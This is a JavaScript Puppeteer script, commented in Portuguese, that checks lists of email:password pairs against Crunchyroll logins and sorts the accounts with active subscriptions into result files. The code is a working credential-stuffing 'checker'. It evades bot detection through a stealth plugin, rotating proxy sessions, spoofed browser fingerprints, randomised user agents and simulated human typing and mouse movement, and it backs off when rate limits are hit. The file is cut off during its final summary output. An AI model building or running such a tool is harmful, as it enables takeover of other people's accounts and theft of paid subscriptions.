/**
 * Verificador de Assinatura Crunchyroll
 * 
 * Verifica se as contas possuem assinatura ativa ou falha
 * 
 * Login: https://sso.crunchyroll.com/pt-br/login
 * Verificação: https://www.crunchyroll.com/payments/history
 * 
 * Status:
 * - Completed = Assinatura ATIVA
 * - Failed = Assinatura FALHOU/EXPIRADA
 * - Invalid Email = Email inválido ou já cadastrado
 * - Rate Limited = Limite de tentativas atingido
 * 
 * @version 3.0.0 - Anti-detecção avançada + Feedback visual + Modo visível
 */

import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

// Configurar __dirname para ES Modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Configurar Stealth Plugin com todas as evasões
const stealth = StealthPlugin();
stealth.enabledEvasions.delete('iframe.contentWindow');
stealth.enabledEvasions.delete('media.codecs');
puppeteer.use(stealth);

// Configurações
const LOGIN_URL = 'https://sso.crunchyroll.com/pt-br/login';
const PAYMENTS_URL = 'https://www.crunchyroll.com/pt-br/account/subscription';
const ACCOUNT_URL = 'https://www.crunchyroll.com/pt-br/account';
const DATA_DIR = path.join(__dirname, 'data');

// Garantir que o diretório data existe
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Arquivos de resultado
const COMPLETED_FILE = path.join(DATA_DIR, 'verificador_completed.txt');
const COMPLETED_SIMPLE_FILE = path.join(DATA_DIR, 'verificador_completed_simples.txt');
const FAILED_FILE = path.join(DATA_DIR, 'verificador_failed.txt');
const LOGIN_FAILED_FILE = path.join(DATA_DIR, 'verificador_login_failed.txt');
const NO_PAYMENT_FILE = path.join(DATA_DIR, 'verificador_no_payment.txt');
const INVALID_EMAIL_FILE = path.join(DATA_DIR, 'verificador_invalid_email.txt');
const RATE_LIMITED_FILE = path.join(DATA_DIR, 'verificador_rate_limited.txt');

// User Agents variados (Chrome Windows/Mac)
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

// Viewports variados
const VIEWPORTS = [
    { width: 1920, height: 1080 },
    { width: 1366, height: 768 },
    { width: 1440, height: 900 },
    { width: 1536, height: 864 },
    { width: 1280, height: 720 },
    { width: 1600, height: 900 },
];

// Seletores do Crunchyroll (CORRIGIDOS)
const SELECTORS = {
    EMAIL_INPUT: [
        'input[name="login"]',
        'input[name="email"]',
        'input[type="email"]',
        'input[id="login"]',
        'input[autocomplete="username"]',
        '#login',
        '#email'
    ],
    PASSWORD_INPUT: [
        'input[name="password"]',
        'input[type="password"]',
        'input[id="password"]',
        '#password'
    ],
    LOGIN_BUTTON: [
        'button[type="submit"]',
        'button[data-testid="login-submit"]',
        'button[class*="submit"]',
        'button[class*="login"]',
        'input[type="submit"]'
    ],
    NEXT_BUTTON: [
        'button[type="submit"]',
        'button:contains("PRÓXIMO")',
        'button:contains("Próximo")',
        'button:contains("NEXT")',
        'button:contains("Next")'
    ],
    // Mensagens de erro específicas
    ERROR_MESSAGES: {
        INVALID_EMAIL: 'Digite um endereço de e-mail válido',
        RATE_LIMITED: 'Você atingiu o limite de tentativas',
        INVALID_CREDENTIALS: ['invalid', 'incorrect', 'inválido', 'incorreta', 'senha errada', 'wrong password', 'credenciais']
    }
};

// Indicadores de status de assinatura
const SUBSCRIPTION_INDICATORS = {
    ACTIVE: [
        'Premium',
        'Mega Fan',
        'Ultimate Fan',
        'Fan',
        'Ativa',
        'Active',
        'Assinatura ativa',
        'Subscription active',
        'Renovação automática',
        'Auto-renewal',
        'Próxima cobrança',
        'Next billing'
    ],
    INACTIVE: [
        'Expired',
        'Expirada',
        'Cancelled',
        'Cancelada',
        'Inativa',
        'Inactive',
        'Free',
        'Gratuito',
        'Assine agora',
        'Subscribe now',
        'Não possui assinatura',
        'No subscription'
    ]
};

// Contadores globais para feedback em tempo real
const stats = {
    total: 0,
    current: 0,
    completed: 0,
    failed: 0,
    loginFailed: 0,
    noPayment: 0,
    invalidEmail: 0,
    rateLimited: 0,
    errors: 0
};

// Função para log com feedback visual melhorado
function log(type, message) {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    const icons = {
        'INFO': 'ℹ️',
        'OK': '✅',
        'SUCESSO': '🎉',
        'ERRO': '❌',
        'AVISO': '⚠️',
        'ETAPA': '📍',
        'VERIFICADOR': '🔍',
        'PROXY': '🌐',
        'RESULTADO': '📊',
        'CONTA': '👤',
        'STATUS': '📈'
    };
    const icon = icons[type] || '•';
    console.log(`[${timestamp}][${type}] ${icon} ${message}`);
}

// Função para exibir status em tempo real
function showStatus() {
    const progress = stats.total > 0 ? Math.round((stats.current / stats.total) * 100) : 0;
    const bar = '█'.repeat(Math.floor(progress / 5)) + '░'.repeat(20 - Math.floor(progress / 5));
    
    console.log('');
    console.log('╔════════════════════════════════════════════════════════════╗');
    console.log(`║  📊 PROGRESSO: [${bar}] ${progress}% (${stats.current}/${stats.total})`.padEnd(63) + '║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log(`║  ✅ Ativas (Completed):    ${String(stats.completed).padStart(4)}                           ║`);
    console.log(`║  ❌ Falhas (Failed):       ${String(stats.failed).padStart(4)}                           ║`);
    console.log(`║  🔒 Login Falhou:          ${String(stats.loginFailed).padStart(4)}                           ║`);
    console.log(`║  📋 Sem Assinatura:        ${String(stats.noPayment).padStart(4)}                           ║`);
    console.log(`║  📧 Email Inválido:        ${String(stats.invalidEmail).padStart(4)}                           ║`);
    console.log(`║  ⏱️  Rate Limited:          ${String(stats.rateLimited).padStart(4)}                           ║`);
    console.log(`║  💥 Erros:                 ${String(stats.errors).padStart(4)}                           ║`);
    console.log('╚════════════════════════════════════════════════════════════╝');
    console.log('');
}

// Função para salvar resultado
function saveResult(file, content) {
    fs.appendFileSync(file, content + '\n', 'utf-8');
}

// Função para limpar arquivos de resultado
function clearResults() {
    const files = [
        COMPLETED_FILE, COMPLETED_SIMPLE_FILE, FAILED_FILE, 
        LOGIN_FAILED_FILE, NO_PAYMENT_FILE, INVALID_EMAIL_FILE, RATE_LIMITED_FILE
    ];
    files.forEach(file => {
        if (fs.existsSync(file)) {
            fs.writeFileSync(file, '', 'utf-8');
        }
    });
}

// Função para carregar contas
function loadAccounts() {
    const verificarPath = path.join(DATA_DIR, 'verificar.txt');
    
    if (!fs.existsSync(verificarPath)) {
        log('ERRO', 'Arquivo verificar.txt não encontrado!');
        return [];
    }
    
    const content = fs.readFileSync(verificarPath, 'utf-8');
    const accounts = content.split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'))
        .map(line => {
            const separator = line.includes('|') ? '|' : ':';
            const parts = line.split(separator);
            if (parts.length >= 2) {
                return {
                    email: parts[0].trim(),
                    password: parts.slice(1).join(separator).trim(),
                    original: line,
                    simple: `${parts[0].trim()}:${parts.slice(1).join(separator).trim()}`
                };
            }
            return null;
        })
        .filter(acc => acc !== null);
    
    return accounts;
}

// Configurar proxy
function getProxyConfig() {
    const config = {
        enabled: process.env.PROXY_ENABLED === 'true',
        host: process.env.PROXY_HOST || '',
        port: parseInt(process.env.PROXY_PORT) || 0,
        username: process.env.PROXY_USERNAME || '',
        password: process.env.PROXY_PASSWORD || '',
        fullString: process.env.PROXY_FULL_STRING || ''
    };
    
    if (config.fullString) {
        const parts = config.fullString.split(':');
        if (parts.length >= 4) {
            config.host = parts[0];
            config.port = parseInt(parts[1]);
            config.username = parts[2];
            config.password = parts[3];
        }
    }
    
    return config;
}

// Gerar sessão única para IP rotativo
function generateSession() {
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(2, 15);
    return `session_${timestamp}_${random}`;
}

// Funções utilitárias
function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getRandomViewport() {
    return VIEWPORTS[Math.floor(Math.random() * VIEWPORTS.length)];
}

// Delay com variação aleatória (mais humano)
function delay(baseMs) {
    const variation = baseMs * 0.3; // 30% de variação
    const actualDelay = baseMs + (Math.random() * variation * 2 - variation);
    return new Promise(resolve => setTimeout(resolve, Math.max(500, actualDelay)));
}

// Delay aleatório entre min e max
function randomDelay(min, max) {
    const ms = Math.floor(Math.random() * (max - min + 1)) + min;
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Simular movimento de mouse aleatório
async function simulateMouseMovement(page) {
    try {
        const viewport = page.viewport();
        const x = Math.floor(Math.random() * (viewport.width - 100)) + 50;
        const y = Math.floor(Math.random() * (viewport.height - 100)) + 50;
        
        // Movimento em curva (mais humano)
        const steps = Math.floor(Math.random() * 10) + 5;
        await page.mouse.move(x, y, { steps });
        await randomDelay(100, 300);
    } catch (e) {
        // Ignorar erros de movimento de mouse
    }
}

// Simular digitação humana com delays variáveis
async function typeHumanLike(page, selector, text) {
    try {
        await page.click(selector);
        await randomDelay(200, 500);
        
        // Limpar campo antes de digitar
        await page.evaluate((sel) => {
            const el = document.querySelector(sel);
            if (el) el.value = '';
        }, selector);
        
        // Digitar caractere por caractere com delays variáveis
        for (const char of text) {
            await page.type(selector, char, { delay: Math.floor(Math.random() * 100) + 50 });
            
            // Ocasionalmente pausar (como humano pensando)
            if (Math.random() < 0.1) {
                await randomDelay(200, 500);
            }
        }
        
        await randomDelay(300, 600);
        return true;
    } catch (e) {
        return false;
    }
}

// Função para encontrar e clicar em elemento
async function findAndClick(page, selectors, description) {
    // Simular movimento de mouse antes de clicar
    await simulateMouseMovement(page);
    
    for (const selector of selectors) {
        try {
            const element = await page.$(selector);
            if (element) {
                // Verificar se está visível
                const isVisible = await page.evaluate(el => {
                    const style = window.getComputedStyle(el);
                    return style.display !== 'none' && style.visibility !== 'hidden' && el.offsetParent !== null;
                }, element);
                
                if (isVisible) {
                    await randomDelay(200, 500);
                    await element.click();
                    log('OK', `Clicou em ${description}`);
                    return true;
                }
            }
        } catch (e) {
            // Tentar próximo seletor
        }
    }
    
    // Tentar por texto
    try {
        const clicked = await page.evaluate((desc) => {
            const buttons = document.querySelectorAll('button, input[type="submit"]');
            for (const btn of buttons) {
                const text = (btn.innerText || btn.value || '').toLowerCase();
                if (text.includes('próximo') || text.includes('next') || 
                    text.includes('entrar') || text.includes('login') ||
                    text.includes('submit')) {
                    btn.click();
                    return true;
                }
            }
            return false;
        }, description);
        
        if (clicked) {
            log('OK', `Clicou em ${description} por texto`);
            return true;
        }
    } catch (e) {
        // Ignorar
    }
    
    return false;
}

// Função para encontrar e preencher campo com digitação humana
async function findAndType(page, selectors, value, description) {
    await simulateMouseMovement(page);
    
    for (const selector of selectors) {
        try {
            const element = await page.$(selector);
            if (element) {
                const isVisible = await page.evaluate(el => {
                    const style = window.getComputedStyle(el);
                    return style.display !== 'none' && style.visibility !== 'hidden' && el.offsetParent !== null;
                }, element);
                
                if (isVisible) {
                    const success = await typeHumanLike(page, selector, value);
                    if (success) {
                        log('OK', `Preencheu ${description}`);
                        return true;
                    }
                }
            }
        } catch (e) {
            // Tentar próximo seletor
        }
    }
    return false;
}

// Função para tratar banner de cookies
async function handleCookieBanner(page) {
    try {
        const cookieSelectors = [
            'button[id*="accept"]',
            'button[class*="accept"]',
            '[data-testid="cookie-accept"]',
            '.cookie-accept',
            '#onetrust-accept-btn-handler'
        ];
        
        for (const selector of cookieSelectors) {
            try {
                const btn = await page.$(selector);
                if (btn) {
                    await btn.click();
                    log('INFO', 'Banner de cookies fechado');
                    await delay(500);
                    return;
                }
            } catch (e) {
                // Ignorar
            }
        }
        
        // Tentar por texto
        await page.evaluate(() => {
            const buttons = document.querySelectorAll('button');
            for (const btn of buttons) {
                const text = (btn.innerText || '').toLowerCase();
                if (text.includes('aceitar') || text.includes('accept') || 
                    text.includes('concordo') || text.includes('agree')) {
                    btn.click();
                    break;
                }
            }
        });
    } catch (e) {
        // Ignorar erros de cookie banner
    }
}

// Verificar mensagens de erro específicas
async function checkForErrors(page) {
    try {
        const pageContent = await page.content();
        const pageText = await page.evaluate(() => document.body.innerText || '');
        
        // Verificar email inválido
        if (pageContent.includes('Digite um endereço de e-mail válido') || 
            pageText.includes('Digite um endereço de e-mail válido')) {
            return { type: 'invalid_email', message: 'Email inválido ou já cadastrado' };
        }
        
        // Verificar rate limit
        if (pageContent.includes('Você atingiu o limite de tentativas') ||
            pageText.includes('Você atingiu o limite de tentativas')) {
            return { type: 'rate_limited', message: 'Limite de tentativas atingido' };
        }
        
        // Verificar CAPTCHA
        if (pageContent.includes('captcha') || pageContent.includes('recaptcha') ||
            pageContent.includes('hcaptcha')) {
            return { type: 'captcha', message: 'CAPTCHA detectado' };
        }
        
        return null;
    } catch (e) {
        return null;
    }
}

// Função principal de verificação com retry
async function verificarContaComRetry(account, proxyConfig, maxRetries = 2) {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            if (attempt > 1) {
                log('AVISO', `Tentativa ${attempt}/${maxRetries} para ${account.email}`);
                // Backoff exponencial: 10s, 20s, 40s
                const waitTime = Math.pow(2, attempt - 1) * 10000;
                log('INFO', `Aguardando ${waitTime/1000}s antes de retry...`);
                await delay(waitTime);
            }
            
            const result = await verificarConta(account, proxyConfig);
            
            // Se foi rate limited, não tentar novamente
            if (result.status === 'rate_limited') {
                return result;
            }
            
            return result;
        } catch (error) {
            if (attempt === maxRetries) {
                log('ERRO', `Todas as ${maxRetries} tentativas falharam para ${account.email}`);
                return { status: 'error', account, error: error.message };
            }
        }
    }
}

// Função principal de verificação
async function verificarConta(account, proxyConfig) {
    let browser = null;
    
    try {
        log('CONTA', `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        log('VERIFICADOR', `Verificando: ${account.email}`);
        
        // Configurar opções do browser - MODO VISÍVEL
        const viewport = getRandomViewport();
        const userAgent = getRandomUserAgent();
        
        const launchOptions = {
            headless: false, // MODO VISÍVEL - evita detecção
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                `--window-size=${viewport.width},${viewport.height}`,
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-site-isolation-trials',
                '--disable-features=BlockInsecurePrivateNetworkRequests',
                '--disable-client-side-phishing-detection',
                '--disable-default-apps',
                '--disable-hang-monitor',
                '--disable-popup-blocking',
                '--disable-prompt-on-repost',
                '--disable-sync',
                '--disable-translate',
                '--metrics-recording-only',
                '--no-first-run',
                '--safebrowsing-disable-auto-update',
                '--lang=pt-BR',
                '--no-default-browser-check'
            ],
            defaultViewport: null, // Usar tamanho da janela
            ignoreDefaultArgs: ['--enable-automation']
        };
        
        // Adicionar proxy se habilitado
        if (proxyConfig.enabled && proxyConfig.host && proxyConfig.port) {
            const session = generateSession();
            launchOptions.args.push(`--proxy-server=http://${proxyConfig.host}:${proxyConfig.port}`);
            log('PROXY', `Usando proxy: ${proxyConfig.host}:${proxyConfig.port}`);
        }
        
        browser = await puppeteer.launch(launchOptions);
        const page = await browser.newPage();
        
        // Injetar código anti-detecção adicional
        await page.evaluateOnNewDocument(() => {
            // Remover navigator.webdriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            
            // Simular chrome
            window.chrome = {
                runtime: {},
                loadTimes: function() {},
                csi: function() {},
                app: {}
            };
            
            // Simular plugins
            Object.defineProperty(navigator, 'plugins', {
                get: () => [
                    { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                    { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                    { name: 'Native Client', filename: 'internal-nacl-plugin' }
                ],
            });
            
            // Simular languages
            Object.defineProperty(navigator, 'languages', {
                get: () => ['pt-BR', 'pt', 'en-US', 'en'],
            });
            
            // Simular permissões
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );
            
            // Mascarar WebGL
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {
                if (parameter === 37445) {
                    return 'Intel Inc.';
                }
                if (parameter === 37446) {
                    return 'Intel Iris OpenGL Engine';
                }
                return getParameter.apply(this, arguments);
            };
        });
        
        // Configurar autenticação de proxy se necessário
        if (proxyConfig.enabled && proxyConfig.username && proxyConfig.password) {
            const session = generateSession();
            let proxyUsername = proxyConfig.username;
            
            if (!proxyUsername.includes('-session-')) {
                proxyUsername = `${proxyUsername}-session-${session}`;
            }
            
            await page.authenticate({
                username: proxyUsername,
                password: proxyConfig.password
            });
        }
        
        // Configurar viewport e user agent
        await page.setViewport(viewport);
        await page.setUserAgent(userAgent);
        
        // Configurar headers realistas
        await page.setExtraHTTPHeaders({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        });
        
        // Pré-configurar cookies simulando navegador real
        await page.setCookie(
            {
                name: '_ga',
                value: 'GA1.2.' + Math.random().toString().slice(2),
                domain: '.crunchyroll.com',
                path: '/',
                expires: Date.now() / 1000 + 31536000,
            },
            {
                name: '_gid',
                value: 'GA1.2.' + Math.random().toString().slice(2),
                domain: '.crunchyroll.com',
                path: '/',
                expires: Date.now() / 1000 + 86400,
            }
        );
        
        // Timeout geral
        page.setDefaultTimeout(60000);
        page.setDefaultNavigationTimeout(60000);
        
        // ========== ETAPA 1: LOGIN ==========
        log('ETAPA', 'Acessando página de login...');
        
        try {
            await page.goto(LOGIN_URL, { waitUntil: 'networkidle2', timeout: 60000 });
        } catch (navError) {
            log('AVISO', `Timeout na navegação, tentando continuar...`);
        }
        
        // Delay inicial mais longo (comportamento humano)
        await randomDelay(3000, 5000);
        
        // Simular movimento de mouse inicial
        await simulateMouseMovement(page);
        
        // Tratar cookies
        await handleCookieBanner(page);
        await randomDelay(1000, 2000);
        
        // Verificar erros antes de continuar
        const initialError = await checkForErrors(page);
        if (initialError) {
            if (initialError.type === 'rate_limited') {
                log('ERRO', `[RATE LIMITED] ${account.email} - ${initialError.message}`);
                saveResult(RATE_LIMITED_FILE, account.original);
                stats.rateLimited++;
                await browser.close();
                return { status: 'rate_limited', account };
            }
        }
        
        // Verificar se já está logado
        const currentUrl = page.url();
        if (!currentUrl.includes('login') && !currentUrl.includes('sso')) {
            log('INFO', 'Parece já estar logado, verificando...');
        } else {
            // Preencher email com comportamento humano
            log('ETAPA', 'Preenchendo email...');
            await simulateMouseMovement(page);
            await randomDelay(500, 1000);
            
            const emailFilled = await findAndType(page, SELECTORS.EMAIL_INPUT, account.email, 'email');
            
            if (!emailFilled) {
                log('ERRO', `Não encontrou campo de email para: ${account.email}`);
                saveResult(LOGIN_FAILED_FILE, account.original);
                stats.loginFailed++;
                await browser.close();
                return { status: 'login_failed', account };
            }
            
            await randomDelay(1500, 3000);
            
            // Verificar erro de email inválido
            const emailError = await checkForErrors(page);
            if (emailError && emailError.type === 'invalid_email') {
                log('ERRO', `[EMAIL INVÁLIDO] ${account.email} - ${emailError.message}`);
                saveResult(INVALID_EMAIL_FILE, account.original);
                stats.invalidEmail++;
                await browser.close();
                return { status: 'invalid_email', account };
            }
            
            // Clicar em próximo (se houver)
            await findAndClick(page, SELECTORS.NEXT_BUTTON, 'próximo');
            await randomDelay(2000, 4000);
            
            // Verificar erros após clicar próximo
            const nextError = await checkForErrors(page);
            if (nextError) {
                if (nextError.type === 'invalid_email') {
                    log('ERRO', `[EMAIL INVÁLIDO] ${account.email} - ${nextError.message}`);
                    saveResult(INVALID_EMAIL_FILE, account.original);
                    stats.invalidEmail++;
                    await browser.close();
                    return { status: 'invalid_email', account };
                }
                if (nextError.type === 'rate_limited') {
                    log('ERRO', `[RATE LIMITED] ${account.email} - ${nextError.message}`);
                    saveResult(RATE_LIMITED_FILE, account.original);
                    stats.rateLimited++;
                    await browser.close();
                    return { status: 'rate_limited', account };
                }
            }
            
            // Preencher senha com comportamento humano
            log('ETAPA', 'Preenchendo senha...');
            await simulateMouseMovement(page);
            await randomDelay(500, 1000);
            
            const passwordFilled = await findAndType(page, SELECTORS.PASSWORD_INPUT, account.password, 'senha');
            
            if (!passwordFilled) {
                // Tentar novamente após um delay maior
                await randomDelay(3000, 5000);
                const retryPassword = await findAndType(page, SELECTORS.PASSWORD_INPUT, account.password, 'senha (retry)');
                if (!retryPassword) {
                    log('ERRO', `Não encontrou campo de senha para: ${account.email}`);
                    saveResult(LOGIN_FAILED_FILE, account.original);
                    stats.loginFailed++;
                    await browser.close();
                    return { status: 'login_failed', account };
                }
            }
            
            await randomDelay(1500, 3000);
            
            // Simular movimento antes de clicar login
            await simulateMouseMovement(page);
            
            // Clicar no botão de login
            log('ETAPA', 'Clicando em login...');
            const loginClicked = await findAndClick(page, SELECTORS.LOGIN_BUTTON, 'login');
            
            if (!loginClicked) {
                // Tentar Enter
                await page.keyboard.press('Enter');
            }
            
            // Aguardar navegação com timeout maior
            try {
                await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 45000 });
            } catch (e) {
                // Continuar mesmo com timeout
            }
            
            await randomDelay(5000, 8000);
        }
        
        // Verificar erros após login
        const loginError = await checkForErrors(page);
        if (loginError) {
            if (loginError.type === 'rate_limited') {
                log('ERRO', `[RATE LIMITED] ${account.email} - ${loginError.message}`);
                saveResult(RATE_LIMITED_FILE, account.original);
                stats.rateLimited++;
                await browser.close();
                return { status: 'rate_limited', account };
            }
            if (loginError.type === 'invalid_email') {
                log('ERRO', `[EMAIL INVÁLIDO] ${account.email} - ${loginError.message}`);
                saveResult(INVALID_EMAIL_FILE, account.original);
                stats.invalidEmail++;
                await browser.close();
                return { status: 'invalid_email', account };
            }
        }
        
        // Verificar se login foi bem sucedido
        const afterLoginUrl = page.url();
        const pageText = await page.evaluate(() => document.body.innerText || '');
        
        // Verificar indicadores de falha de login
        const loginFailed = 
            afterLoginUrl.includes('login') ||
            SELECTORS.ERROR_MESSAGES.INVALID_CREDENTIALS.some(msg => 
                pageText.toLowerCase().includes(msg.toLowerCase())
            );
        
        if (loginFailed) {
            log('ERRO', `[LOGIN FALHOU] ${account.email} - Credenciais inválidas`);
            saveResult(LOGIN_FAILED_FILE, account.original);
            stats.loginFailed++;
            await browser.close();
            return { status: 'login_failed', account };
        }
        
        log('OK', 'Login realizado com sucesso!');
        
        // ========== ETAPA 2: VERIFICAR ASSINATURA ==========
        log('ETAPA', 'Verificando status da assinatura...');
        
        // Simular comportamento humano antes de navegar
        await simulateMouseMovement(page);
        await randomDelay(2000, 4000);
        
        // Navegar para página de conta/assinatura
        try {
            await page.goto(ACCOUNT_URL, { waitUntil: 'networkidle2', timeout: 45000 });
        } catch (e) {
            log('AVISO', 'Timeout ao acessar conta, tentando continuar...');
        }
        
        await randomDelay(3000, 5000);
        
        // Obter conteúdo da página
        const accountText = await page.evaluate(() => document.body.innerText || '');
        
        log('INFO', 'Analisando status de assinatura...');
        
        // Verificar indicadores de assinatura ATIVA
        const hasActiveSubscription = SUBSCRIPTION_INDICATORS.ACTIVE.some(indicator => 
            accountText.toLowerCase().includes(indicator.toLowerCase())
        );
        
        // Verificar indicadores de assinatura INATIVA
        const hasInactiveSubscription = SUBSCRIPTION_INDICATORS.INACTIVE.some(indicator =>
            accountText.toLowerCase().includes(indicator.toLowerCase())
        );
        
        // Verificar também na página de pagamentos
        try {
            await simulateMouseMovement(page);
            await randomDelay(1000, 2000);
            
            await page.goto(PAYMENTS_URL, { waitUntil: 'networkidle2', timeout: 45000 });
            await randomDelay(2000, 4000);
            
            const paymentsText = await page.evaluate(() => document.body.innerText || '');
            
            // Verificar status de pagamento
            if (paymentsText.includes('Completed') || paymentsText.includes('Concluído')) {
                log('SUCESSO', `[COMPLETED] ${account.email} - Assinatura ATIVA!`);
                saveResult(COMPLETED_FILE, account.original);
                saveResult(COMPLETED_SIMPLE_FILE, account.simple);
                stats.completed++;
                await browser.close();
                return { status: 'completed', account };
            }
            
            if (paymentsText.includes('Failed') || paymentsText.includes('Falhou')) {
                log('ERRO', `[FAILED] ${account.email} - Pagamento FALHOU!`);
                saveResult(FAILED_FILE, account.original);
                stats.failed++;
                await browser.close();
                return { status: 'failed', account };
            }
        } catch (e) {
            // Ignorar erro de navegação
        }
        
        // Decisão final baseada nos indicadores
        if (hasActiveSubscription && !hasInactiveSubscription) {
            log('SUCESSO', `[COMPLETED] ${account.email} - Assinatura ATIVA!`);
            saveResult(COMPLETED_FILE, account.original);
            saveResult(COMPLETED_SIMPLE_FILE, account.simple);
            stats.completed++;
            await browser.close();
            return { status: 'completed', account };
        }
        
        if (hasInactiveSubscription || !hasActiveSubscription) {
            log('AVISO', `[SEM ASSINATURA] ${account.email} - Sem assinatura ativa`);
            saveResult(NO_PAYMENT_FILE, account.original);
            stats.noPayment++;
            await browser.close();
            return { status: 'no_payment', account };
        }
        
        // Status desconhecido
        log('AVISO', `[DESCONHECIDO] ${account.email} - Status não identificado`);
        saveResult(NO_PAYMENT_FILE, account.original);
        stats.noPayment++;
        await browser.close();
        return { status: 'unknown', account };
        
    } catch (error) {
        log('ERRO', `Erro ao verificar ${account.email}: ${error.message}`);
        saveResult(LOGIN_FAILED_FILE, account.original);
        stats.errors++;
        
        if (browser) {
            try {
                await browser.close();
            } catch (e) {
                // Ignorar
            }
        }
        
        return { status: 'error', account, error: error.message };
    }
}

// Função principal
async function main() {
    console.log('');
    console.log('╔════════════════════════════════════════════════════════════╗');
    console.log('║                                                            ║');
    console.log('║   🔍 VERIFICADOR DE ASSINATURA CRUNCHYROLL                 ║');
    console.log('║   v3.0.0 - Anti-Detecção + Modo Visível + Feedback         ║');
    console.log('║                                                            ║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log('║   ✅ Stealth Plugin ativado                                ║');
    console.log('║   ✅ Modo visível (headless: false)                        ║');
    console.log('║   ✅ Comportamento humano simulado                         ║');
    console.log('║   ✅ User-Agent e viewport aleatórios                      ║');
    console.log('║   ✅ Detecção de rate limit e email inválido               ║');
    console.log('╚════════════════════════════════════════════════════════════╝');
    console.log('');
    
    // Carregar contas
    const accounts = loadAccounts();
    
    if (accounts.length === 0) {
        log('ERRO', 'Nenhuma conta para verificar!');
        log('INFO', 'Adicione contas no arquivo data/verificar.txt');
        process.exit(1);
    }
    
    stats.total = accounts.length;
    log('VERIFICADOR', `Iniciando verificação de ${accounts.length} conta(s)...`);
    
    // Carregar configuração de proxy
    const proxyConfig = getProxyConfig();
    
    if (proxyConfig.enabled) {
        log('PROXY', `Proxy habilitado: ${proxyConfig.host}:${proxyConfig.port}`);
    } else {
        log('AVISO', 'Proxy não configurado - usando IP local');
    }
    
    // Limpar resultados anteriores
    clearResults();
    
    // Mostrar status inicial
    showStatus();
    
    // Verificar cada conta
    for (let i = 0; i < accounts.length; i++) {
        const account = accounts[i];
        stats.current = i + 1;
        
        console.log('');
        log('STATUS', `Conta ${i + 1}/${accounts.length}`);
        
        const result = await verificarContaComRetry(account, proxyConfig);
        
        // Mostrar status atualizado
        showStatus();
        
        // Se foi rate limited, pausar por mais tempo
        if (result.status === 'rate_limited') {
            log('AVISO', '⏱️ Rate limit detectado! Aguardando 60 segundos...');
            await delay(60000);
        }
        
        // Aguardar entre verificações (delay maior e variável)
        if (i < accounts.length - 1) {
            const waitTime = Math.floor(Math.random() * 5000) + 5000; // 5-10 segundos
            log('INFO', `Aguardando ${Math.round(waitTime/1000)}s antes da próxima conta...`);
            await delay(waitTime);
        }
    }
    
    // Resumo final
    console.log('');
    console.log('╔════════════════════════════════════════════════════════════╗');
    console.log('║                    📊 RESUMO FINAL                         ║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log(`║  ✅ Ativas (Completed):    ${String(stats.completed).padStart(4)}                           ║`);
    console.log(`║  ❌ Falhas (Failed):       ${String(stats.failed).padStart(4)}                           ║`);
    console.log(`║  🔒 Login Falhou:          ${String(stats.loginFailed).padStart(4)}                           ║`);
    console.log(`║  📋 Sem Assinatura:        ${String(stats.noPayment).padStart(4)}                           ║`);
    console.log(`║  📧 Email Inválido:        ${String(stats.invalidEmail).padStart(4)}                           ║`);
